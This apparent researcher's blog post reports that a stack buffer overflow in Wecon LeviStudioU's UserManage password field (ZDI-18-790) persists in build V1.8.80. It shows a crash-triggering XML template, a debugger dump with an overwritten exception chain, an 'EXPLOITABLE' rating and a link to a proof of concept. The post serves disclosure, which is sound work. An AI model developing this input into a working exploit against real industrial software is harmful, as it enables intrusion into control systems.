---
layout: post
title: WECON LeviStudioU
date: 2020-01-22
excerpt: "."
tags: [exploit]
comments: false
---
## Wecon LeviStudioU UserManage PassWord Stack-based Buffer Overflow
[ZDI-18-790](https://www.zerodayinitiative.com/advisories/ZDI-18-790/) still
looks to be vulnerable in the most current build (Release Build 2019-09-21 V1.8.80).
xml like so:
```
<?xml version="1.0" encoding="UTF-8"?>
<project filever="1.0">
	<SourAddrToDestAddrInfo maxlen="100">
	</SourAddrToDestAddrInfo>
<UserList>
<User ID="1" Name="mc" PassWord="FUZZ" Description="mc" GroupIdSet=""/></UserList>
<GroupList>
<Group ID="1" Name="mc" Description="mc" UserIdSet=""/></GroupList></project>
```
when parsed, looks like this:
```
(b78.b7c): Access violation - code c0000005 (!!! second chance !!!)
eax=00000041 ebx=00000001 ecx=00130000 edx=013fb0c4 esi=00000000 edi=00000111
eip=71e0712b esp=0012ce60 ebp=0012ce60 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
MSVCR90!wcscpy+0xe:
71e0712b 668901          mov     word ptr [ecx],ax        ds:0023:00130000=6341
0:000> !exchain
0012d128: UserManage+86e6 (004086e6)
0012d35c: UserManage+8793 (00408793)
0012d4a4: *** ERROR: Module load completed but symbols could not be loaded for C:\Windows\WinSxS\x86_microsoft.vc90.mfc_1fc8b3b9a1e18e3b_9.0.30729.4148_none_4bf5400abf9d60b7\mfc90u.dll
mfc90u+21da9d (7280da9d)
0012d52c: mfc90u+21b4f9 (7280b4f9)
0012d594: mfc90u+219cc9 (72809cc9)
0012d638: USER32!_except_handler4+0 (7617629b)
0012d814: USER32!_except_handler4+0 (7617629b)
0012d874: USER32!_except_handler4+0 (7617629b)
0012d9ac: mfc90u+225d6f (72815d6f)
0012fed4: UserManage+10041 (00410041)
Invalid exception stack at 00410041
0:000> !load msec
0:000> !exploitable
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at MSVCR90!wcscpy+0x000000000000000e (Hash=0x6f7f1e52.0x6368127c)

User mode write access violations that are not near NULL are exploitable.
```
[poc](https://github.com/ceballosm/scratchpad/blob/master/WECON-LeviStudioU-UserManage-PassWord.tar.gz)
